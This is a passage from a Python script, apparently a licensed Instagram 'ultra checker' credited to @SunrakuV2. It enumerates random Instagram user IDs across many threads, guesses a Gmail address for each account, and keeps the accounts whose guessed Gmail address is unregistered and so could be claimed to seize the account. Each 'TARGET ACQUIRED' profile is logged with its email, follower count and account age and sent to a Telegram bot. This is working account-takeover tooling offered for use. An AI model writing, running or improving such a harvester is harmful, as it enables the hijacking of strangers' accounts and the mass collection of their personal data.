<b>🏷️ {pf('USERNAME')}</b>   ➜  <i>@{username}</i>
<b>🌍 {pf('DOMAIN')}</b>     ➜  <i>{domain}</i>
<b>📬 {pf('EMAIL')}</b>      ➜  <code>{email}</code>
<b>📆 {pf('YEAR')}</b>       ➜  <i>{year}</i>
<b>💭 {pf('BIO')}</b>        ➜  <i>{bio if bio else 'No bio'}</i>

<b>└───────────────────────────────────┘</b>

<b>┌─ {pf('METRICS')} ────────────────┐</b>

<b>🏆 {pf('FOLLOWERS')}</b>  ➜  <b>{_fmt_num(followers)}</b>
<b>🚀 {pf('FOLLOWING')}</b>  ➜  <b>{_fmt_num(following)}</b>
<b>📷 {pf('POSTS')}</b>      ➜  <b>{_fmt_num(posts)}</b>
<b>{private_badge} {pf('PRIVATE')}</b>    ➜  <b>{'YES' if is_private else 'NO'}</b>

<b>└───────────────────────────────────┘</b>

<b>🔗 {pf('PROFILE LINK')}</b>
<code>instagram.com/{username}</code>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>👑 {pf('OWNER')}</b>      ➜  <b>@SunrakuV2</b>
<b>📡 {pf('BROADCAST')}</b>  ➜  <b>t.me/Anishpy</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>⚡ {pf('ULTRA CHECKER ENGINE')} ⚡</b>
"""

        console_msg = f"""
{HOT_PINK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
  {GOLD}🎯 {pf('TARGET ACQUIRED')} 🎯{RESET}
{HOT_PINK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
  {NEON_CYAN}🧬 {pf('NAME')}{RESET}       : {WHITE}{full_name}{RESET} {verify_badge}
  {NEON_CYAN}🏷️ {pf('USERNAME')}{RESET}   : {WHITE}@{username}{RESET}
  {NEON_CYAN}📬 {pf('EMAIL')}{RESET}      : {WHITE}{email}{RESET}
  {NEON_CYAN}🌍 {pf('DOMAIN')}{RESET}     : {WHITE}{domain}{RESET}
  {NEON_CYAN}🏆 {pf('FOLLOWERS')}{RESET}  : {WHITE}{followers:,}{RESET}
  {NEON_CYAN}🚀 {pf('FOLLOWING')}{RESET}  : {WHITE}{following:,}{RESET}
  {NEON_CYAN}📷 {pf('POSTS')}{RESET}      : {WHITE}{posts}{RESET}
  {NEON_CYAN}📆 {pf('YEAR')}{RESET}       : {WHITE}{year}{RESET}
  {NEON_CYAN}💭 {pf('BIO')}{RESET}        : {WHITE}{bio if bio else '-'}{RESET}
{HOT_PINK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
  {NEON_CYAN}🔗 {pf('PROFILE')}{RESET}    : {WHITE}https://instagram.com/{username}{RESET}
{HOT_PINK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
  {YELLOW}⚡ {pf('Powered by SunrakuV2')}{RESET}
{HOT_PINK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
"""

        return console_msg, telegram_msg

# ============================================================
# MAIN PROCESSING
# ============================================================
reporter = ReportManager(bot_token, chat_id)
google = GoogleChecker()
insta = InstagramChecker()

def process_user():
    global hits, good, bad, ids_checked
    while True:
        # 🔥 EXPIRY CHECK IN THREAD
        if datetime.now() > EXPIRY_DATE:
            print(f"\n{RED}❌ LICENSE EXPIRED!{RESET}")
            sys.exit()
        
        try:
            user_id = random.randint(2500000000, 21254029834)
            ids_checked += 1
            user_data = insta.get_user_data(user_id)
            if not user_data:
                time.sleep(random.uniform(0.05, 0.15))
                continue

            username = user_data.get('username')
            if not username:
                continue

            followers = user_data.get('follower_count', 0)

            email = f"{username}@gmail.com"

            if insta.check_email(email):
                good += 1
                display()

                if google.check_availability(email) == 'good':
                    hits += 1
                    
                    domain = email.split('@')[1]
                    pk = user_data.get('pk', 0)
                    
                    try:
                        pk_int = int(pk)
                        year = "2023+"
                        for low, high, y in [
                            (1, 5000000, 2010), (5000001, 17750000, 2011),
                            (17750001, 279760000, 2012), (279760001, 900990000, 2013),
                            (900990001, 1629010000, 2014), (1629010001, 2369359761, 2015),
                            (2369359762, 4239516754, 2016), (4239516755, 6345108209, 2017),
                            (6345108210, 10016232395, 2018), (10016232396, 27238602159, 2019),
                            (27238602160, 43464475395, 2020), (43464475395, 50289297647, 2021),
                            (50289297647, 57464707082, 2022), (57464707082, 63313426938, 2023),
                        ]:
                            if low <= pk_int <= high:
                                year = str(y)
                                break
                    except:
                        year = "?"
                    
                    is_high = int(followers) >= 10
                    display(new_hit=(username, domain, followers, year, is_high))

                    profile = {
                        'username': username,
                        'email': email,
                        'full_name': user_data.get('full_name', ''),
                        'follower_count': followers,
                        'following_count': user_data.get('following_count') or 0,
                        'media_count': user_data.get('media_count') or 0,
                        'is_private': user_data.get('is_private', False),
                        'is_verified': user_data.get('is_verified', False),
                        'biography': user_data.get('biography', ''),
                        'pk': user_data.get('pk', ''),
                    }
                    
                    console_msg, telegram_msg = reporter.format_result(profile)
                    
                    with _panel_lock:
                        _panel_drawn = False
                    
                    print('\n' + HOT_PINK + '═' * 60 + RESET)
                    print(console_msg)
                    print(HOT_PINK + '═' * 60 + RESET)
                    
                    import re as _re
                    plain_msg = _re.sub(r'<[^>]+>', '', telegram_msg)
                    reporter.save_to_file(plain_msg)
                    reporter.send_telegram(telegram_msg)
            else:
                bad += 1
                display()

            time.sleep(random.uniform(0.05, 0.15))

        except Exception:
            time.sleep(random.uniform(0.1, 0.2))
            continue

# ============================================================
# START
# ============================================================
if __name__ == "__main__":
    display()
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for _ in range(THREADS):
            executor.submit(process_user)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print('\n' + YELLOW + '⚡  ULTRA ENGINE  —  SESSION ENDED  ⚡' + RESET)